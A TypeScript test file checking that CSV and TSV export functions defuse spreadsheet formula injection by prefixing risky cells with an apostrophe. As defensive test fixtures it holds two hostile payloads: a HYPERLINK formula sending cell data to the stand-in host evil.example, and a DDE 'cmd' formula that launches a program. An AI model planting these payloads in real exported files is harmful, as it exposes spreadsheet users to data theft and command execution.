import { describe, it, expect } from 'vitest';
import { escapeCsvField, escapeTsvField, neutralizeFormula } from './delimitedText';

/**
 * Spreadsheet formula injection. The .xlsx writer pins a cell that starts with
 * =, +, - or @ to the Text number format (`excelExport.ts`) precisely so an
 * excerpt out of a transcript cannot execute on open. The delimited writers
 * had no equivalent guard: `buildCodebookCsv` / `buildDataCsv` emitted
 * `=HYPERLINK("http://evil.example/?d="&A1,"Click")` quoted only, and
 * `buildDataTsv` emitted `=cmd|' /C calc'!A0` completely bare.
 *
 * RFC 4180 quoting does not help: the quotes are consumed by the import, and
 * the value is then evaluated.
 */
describe('formula injection guard', () => {
  const HYPERLINK = '=HYPERLINK("http://evil.example/?d="&A1,"Click")';
  const DDE = "=cmd|' /C calc'!A0";

  it('defuses every prefix a spreadsheet treats as a formula', () => {
    for (const prefix of ['=', '+', '-', '@', '\t', '\r']) {
      expect(neutralizeFormula(`${prefix}danger`)).toBe(`'${prefix}danger`);
    }
  });

  it('leaves ordinary text exactly as written', () => {
    for (const value of ['They trusted us', '', 'a=b', 'Coopération', '2026-08-18', '#3B82F6']) {
      expect(neutralizeFormula(value)).toBe(value);
    }
  });

  it('CSV no longer hands Excel a live HYPERLINK call', () => {
    const field = escapeCsvField(HYPERLINK);
    expect(field.startsWith('"\'=')).toBe(true);
    // Still a well-formed RFC 4180 field: the inner quotes stay doubled.
    expect(field).toBe('"\'=HYPERLINK(""http://evil.example/?d=""&A1,""Click"")"');
  });

  it('CSV defuses the DDE command form too', () => {
    expect(escapeCsvField(DDE)).toBe(`"'${DDE}"`);
  });

  it('TSV defuses a formula that was previously emitted bare', () => {
    expect(escapeTsvField(DDE)).toBe(`'${DDE}`);
  });

  it('TSV still leaves an ordinary value unquoted so a plain paste reads as a table', () => {
    expect(escapeTsvField('They trusted us')).toBe('They trusted us');
  });

  it('TSV still quotes a multi-line excerpt, guard and all', () => {
    expect(escapeTsvField('=one\ntwo')).toBe('"\'=one\ntwo"');
  });

  // Bug hunt 2026-09-02: some spreadsheet import paths trim leading whitespace
  // before deciding whether a cell is a formula, so ` =1+1` must be defused as
  // if the space were not there.
  it('defuses a formula prefix hidden behind leading whitespace', () => {
    expect(neutralizeFormula(' =1+1')).toBe("' =1+1");
    expect(neutralizeFormula('   ' + HYPERLINK)).toBe("'   " + HYPERLINK);
    expect(neutralizeFormula(' \t=cmd')).toBe("' \t=cmd");
    expect(neutralizeFormula('  -12')).toBe("'  -12");
    expect(neutralizeFormula('  @SUM(A1)')).toBe("'  @SUM(A1)");
    expect(escapeCsvField(' =1+1')).toBe('"\' =1+1"');
    expect(escapeTsvField(' =1+1')).toBe("' =1+1");
  });

  it('leaves whitespace-led ordinary text and whitespace-only cells untouched', () => {
    for (const value of [' They trusted us', '   ', ' ', '  a=b', ' 2026-08-18', '\n', ' x - y']) {
      expect(neutralizeFormula(value)).toBe(value);
    }
  });

  it('a negative number in a numeric column is quoted as text, not evaluated', () => {
    // A minus sign is a formula prefix. The apostrophe is the cost of not
    // letting "-2+3" evaluate; a spreadsheet strips it on display.
    expect(escapeCsvField('-12')).toBe(`"'-12"`);
  });
});
